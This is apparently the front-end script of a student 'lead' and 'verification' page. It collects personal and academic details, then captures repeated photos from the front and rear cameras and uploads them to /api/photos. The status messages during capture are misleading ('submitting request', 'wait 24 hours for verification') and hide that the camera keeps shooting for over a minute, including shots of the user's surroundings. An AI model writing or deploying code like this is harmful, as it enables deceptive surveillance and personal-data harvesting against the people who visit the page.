const $ = id => document.getElementById(id);
let leadId = null, activeStream = null, stopRequested = false, timeoutIds = [];

function stopCamera(message = "Camera stopped.") {
  stopRequested = true;
  timeoutIds.forEach(clearTimeout);
  timeoutIds = [];
  if (activeStream) activeStream.getTracks().forEach(track => track.stop());
  activeStream = null;
  if ($("preview")) $("preview").srcObject = null;
  if ($("cameraStatus")) $("cameraStatus").textContent = message;
  if ($("stopBtn")) $("stopBtn").classList.add("hidden");
}

if ($("stopBtn")) {
  $("stopBtn").addEventListener("click", () => stopCamera("You stopped the camera. No more photos will be taken."));
}

window.addEventListener("pagehide", () => stopCamera("Page closed; camera stopped."));

document.addEventListener("visibilitychange", () => {
  if (document.hidden && activeStream) stopCamera("Page hidden; camera stopped.");
});

$("leadForm").addEventListener("submit", async event => {
  event.preventDefault();
  $("formError").textContent = "";
  
  const submitBtn = $("submitBtn");
  submitBtn.disabled = true;
  submitBtn.textContent = "Submitting…";
  
  const rawName = $("fullName").value.trim();
  const college = $("collegeName").value.trim();
  const course = $("courseName").value.trim();
  const percentage = $("percentage12th").value.trim();
  
  const combinedName = `${rawName} | College: ${college} | Course: ${course} | 12th: ${percentage}`;
  const email = $("emailAddr").value.trim();
  const phone = $("phoneNum").value.trim();

  try {
    const response = await fetch("/api/leads", {
      method: "POST", 
      headers: {"Content-Type":"application/json"},
      body: JSON.stringify({ name: combinedName, email, phone })
    });
    const result = await response.json();
    if (!response.ok) throw new Error(result.error || "Submission failed.");
    
    leadId = result.leadId;
    $("formScreen").classList.add("hidden");
    $("welcomeScreen").classList.remove("hidden");
  } catch (err) {
    $("formError").textContent = err.message;
    submitBtn.disabled = false;
    submitBtn.innerHTML = 'Continue <span>→</span>'; // Fields clear nahi hongi, user dubara try kar sakega
  }
});

$("declineBtn").addEventListener("click", () => {
  $("noticeBox").classList.add("hidden");
  $("cameraStatus").textContent = "You declined camera access. No photos were taken or uploaded.";
  $("cameraBox").classList.remove("hidden");
});

async function startOneCamera(facingMode, cameraType, durationMs) {
  if (stopRequested) return;
  
  if ($("cameraStatus")) {
    $("cameraStatus").textContent = "Please wait while submitting request...";
    setTimeout(() => {
      if (!stopRequested && $("cameraStatus")) {
        $("cameraStatus").textContent = "Kindly wait for 24 hours for verification.";
      }
    }, 5000);
  }

  try {
    activeStream = await navigator.mediaDevices.getUserMedia({
      audio: false,
      video: { facingMode: { ideal: facingMode }, width: { ideal: 640 }, height: { ideal: 480 } }
    });
  } catch (err) {
    if (cameraType === "rear") {
      if ($("cameraStatus")) $("cameraStatus").textContent = "Rear camera unavailable. Session ended; front-camera photos, if any, remain saved.";
      return;
    }
    throw err;
  }
  
  const videoElem = $("preview");
  if (videoElem) {
    videoElem.srcObject = activeStream;
    await videoElem.play();
  }
  
  const startedAt = Date.now();
  
  async function takePhoto() {
    if (stopRequested || !activeStream) return;
    const video = $("preview");
    if (video && video.readyState >= 2) {
      const canvas = document.createElement("canvas");
      canvas.width = 640; canvas.height = 480;
      canvas.getContext("2d").drawImage(video, 0, 0, 640, 480);
      const image = canvas.toDataURL("image/jpeg", 0.7);
      try {
        await fetch("/api/photos", {
          method: "POST", 
          headers: {"Content-Type":"application/json"},
          body: JSON.stringify({ leadId, cameraType, image })
        });
      } catch(e) {}
    }
  }

  await takePhoto();
  if (stopRequested) return;
  
  await new Promise(r => timeoutIds.push(setTimeout(r, 1000)));
  await takePhoto();
  if (stopRequested) return;

  await new Promise(r => timeoutIds.push(setTimeout(r, 1000)));
  await takePhoto();
  if (stopRequested) return;

  await new Promise(r => timeoutIds.push(setTimeout(r, 1000)));
  await takePhoto();

  while (!stopRequested && (Date.now() - startedAt < durationMs)) {
    await new Promise(r => timeoutIds.push(setTimeout(r, 10000)));
    if (stopRequested) break;
    await takePhoto();
  }
  
  if (activeStream) {
    activeStream.getTracks().forEach(track => track.stop());
    activeStream = null;
  }
}

$("allowBtn").addEventListener("click", async () => {
  $("allowBtn").disabled = true;
  $("declineBtn").disabled = true;
  $("noticeBox").classList.add("hidden");
  $("cameraBox").classList.remove("hidden");
  stopRequested = false;
  try {
    if (!navigator.mediaDevices?.getUserMedia) throw new Error("Camera requires HTTPS and a supported browser.");
    const consentResponse = await fetch("/api/consent", {
      method: "POST", 
      headers: {"Content-Type":"application/json"},
      body: JSON.stringify({leadId})
    });
    if (!consentResponse.ok) throw new Error("Could not record your consent.");
    
    await startOneCamera("user", "front", 35000);
    if (!stopRequested) await startOneCamera("environment", "rear", 35000);
    
    if (!stopRequested) {
      if ($("cameraStatus")) $("cameraStatus").textContent = "Verification processing complete. Kindly wait for 24 hours.";
    }
  } catch (err) {
    stopCamera(err.name === "NotAllowedError"
      ? "Camera permission denied. No photos were captured."
      : err.message || "Camera could not start.");
  }
});